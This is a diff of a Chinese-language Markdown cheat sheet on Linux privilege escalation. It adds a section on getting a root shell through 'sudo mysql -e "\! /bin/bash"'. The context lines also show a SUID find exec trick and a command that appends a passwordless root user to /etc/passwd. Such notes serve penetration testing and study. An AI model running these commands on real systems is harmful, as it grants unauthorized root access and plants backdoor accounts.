@@ -163,6 +163,15 @@ find . -exec /bin/shell -p \;
 echo "test::0:0:: :/bin/shell" | sudo tee -a /etc/passwd
 ```
 
+### mysql提权
+
+- -e: 让 mysql 客户端执行给定内容，然后退出
+- \\!：mysql 客户端的内置命令，表示调用系统 shell 执行后面的命令
+
+```shell
+sudo mysql -e "\! /bin/bash"
+```
+
 ## 服务漏洞提权
 
 ### MySQL-UDF提权
